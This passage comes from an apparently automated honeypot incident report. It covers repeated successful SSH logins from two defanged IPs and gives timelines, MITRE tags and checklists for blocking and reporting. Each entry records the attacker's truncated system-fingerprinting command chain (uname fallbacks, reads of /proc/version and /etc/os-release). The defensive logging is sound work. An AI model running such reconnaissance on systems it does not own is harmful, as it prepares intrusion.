| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:17:02` | `cowrie.session.connect` |
| `2026-07-24 18:17:02` | `cowrie.client.version` |
| `2026-07-24 18:17:02` | `cowrie.client.kex` |
| `2026-07-24 18:17:04` | `cowrie.login.success` |
| `2026-07-24 18:17:06` | `cowrie.session.params` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.success` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.command.input` |
| `2026-07-24 18:17:06` | `cowrie.log.closed` |
| `2026-07-24 18:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc27cccad3c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:17 |
| **Last Seen** | 2026-07-24 18:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:17:38` | `cowrie.session.connect` |
| `2026-07-24 18:17:39` | `cowrie.client.version` |
| `2026-07-24 18:17:39` | `cowrie.client.kex` |
| `2026-07-24 18:17:41` | `cowrie.login.success` |
| `2026-07-24 18:17:43` | `cowrie.session.params` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.success` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.command.input` |
| `2026-07-24 18:17:43` | `cowrie.log.closed` |
| `2026-07-24 18:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05d899991a98

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:18 |
| **Last Seen** | 2026-07-24 18:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:18:46` | `cowrie.session.connect` |
| `2026-07-24 18:18:46` | `cowrie.client.version` |
| `2026-07-24 18:18:46` | `cowrie.client.kex` |
| `2026-07-24 18:18:48` | `cowrie.login.success` |
| `2026-07-24 18:18:49` | `cowrie.session.params` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.success` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:49` | `cowrie.command.input` |
| `2026-07-24 18:18:50` | `cowrie.log.closed` |
| `2026-07-24 18:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e92f5ea5d5cb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:18 |
| **Last Seen** | 2026-07-24 18:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:18:53` | `cowrie.session.connect` |
| `2026-07-24 18:18:53` | `cowrie.client.version` |
| `2026-07-24 18:18:53` | `cowrie.client.kex` |
| `2026-07-24 18:18:56` | `cowrie.login.success` |
| `2026-07-24 18:18:57` | `cowrie.session.params` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.success` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:57` | `cowrie.command.input` |
| `2026-07-24 18:18:58` | `cowrie.log.closed` |
| `2026-07-24 18:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a25298949ba

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:20 |
| **Last Seen** | 2026-07-24 18:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:20:09` | `cowrie.session.connect` |
| `2026-07-24 18:20:09` | `cowrie.client.version` |
| `2026-07-24 18:20:09` | `cowrie.client.kex` |
| `2026-07-24 18:20:11` | `cowrie.login.success` |
| `2026-07-24 18:20:12` | `cowrie.session.params` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.success` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:12` | `cowrie.command.input` |
| `2026-07-24 18:20:13` | `cowrie.log.closed` |
| `2026-07-24 18:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4354d53ce18f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:21 |
| **Last Seen** | 2026-07-24 18:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:21:23` | `cowrie.session.connect` |
| `2026-07-24 18:21:24` | `cowrie.client.version` |
| `2026-07-24 18:21:24` | `cowrie.client.kex` |
| `2026-07-24 18:21:26` | `cowrie.login.success` |
| `2026-07-24 18:21:27` | `cowrie.session.params` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.success` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.command.input` |
| `2026-07-24 18:21:27` | `cowrie.log.closed` |
| `2026-07-24 18:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b027af741e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:22 |
| **Last Seen** | 2026-07-24 18:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:22:01` | `cowrie.session.connect` |
| `2026-07-24 18:22:01` | `cowrie.client.version` |
| `2026-07-24 18:22:01` | `cowrie.client.kex` |
| `2026-07-24 18:22:04` | `cowrie.login.success` |
| `2026-07-24 18:22:05` | `cowrie.session.params` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.success` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:05` | `cowrie.command.input` |
| `2026-07-24 18:22:06` | `cowrie.log.closed` |
| `2026-07-24 18:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-403b5c6f1bad

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:22 |
| **Last Seen** | 2026-07-24 18:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:22:35` | `cowrie.session.connect` |
| `2026-07-24 18:22:35` | `cowrie.client.version` |
| `2026-07-24 18:22:35` | `cowrie.client.kex` |
| `2026-07-24 18:22:37` | `cowrie.login.success` |
| `2026-07-24 18:22:38` | `cowrie.session.params` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.success` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:38` | `cowrie.command.input` |
| `2026-07-24 18:22:39` | `cowrie.log.closed` |
| `2026-07-24 18:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c818710d9c62

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:23 |
| **Last Seen** | 2026-07-24 18:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:23:39` | `cowrie.session.connect` |
| `2026-07-24 18:23:40` | `cowrie.client.version` |
| `2026-07-24 18:23:40` | `cowrie.client.kex` |
| `2026-07-24 18:23:41` | `cowrie.login.success` |
| `2026-07-24 18:23:43` | `cowrie.session.params` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.success` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.command.input` |
| `2026-07-24 18:23:43` | `cowrie.log.closed` |
| `2026-07-24 18:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8993a1387e81

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:23 |
| **Last Seen** | 2026-07-24 18:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:23:47` | `cowrie.session.connect` |
| `2026-07-24 18:23:47` | `cowrie.client.version` |
| `2026-07-24 18:23:47` | `cowrie.client.kex` |
| `2026-07-24 18:23:49` | `cowrie.login.success` |
| `2026-07-24 18:23:51` | `cowrie.session.params` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.success` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.command.input` |
| `2026-07-24 18:23:51` | `cowrie.log.closed` |
| `2026-07-24 18:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0edbf8b0e050

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:24 |
| **Last Seen** | 2026-07-24 18:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:24:59` | `cowrie.session.connect` |
| `2026-07-24 18:24:59` | `cowrie.client.version` |
| `2026-07-24 18:24:59` | `cowrie.client.kex` |
| `2026-07-24 18:25:01` | `cowrie.login.success` |
| `2026-07-24 18:25:02` | `cowrie.session.params` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.success` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:02` | `cowrie.command.input` |
| `2026-07-24 18:25:03` | `cowrie.log.closed` |
| `2026-07-24 18:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ed61e9e85e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:25 |
| **Last Seen** | 2026-07-24 18:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:25:19` | `cowrie.session.connect` |
| `2026-07-24 18:25:20` | `cowrie.client.version` |
| `2026-07-24 18:25:20` | `cowrie.client.kex` |
| `2026-07-24 18:25:21` | `cowrie.login.success` |
| `2026-07-24 18:25:23` | `cowrie.session.params` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.success` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.command.input` |
| `2026-07-24 18:25:23` | `cowrie.log.closed` |
| `2026-07-24 18:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c1b211ed02

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:26 |
| **Last Seen** | 2026-07-24 18:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
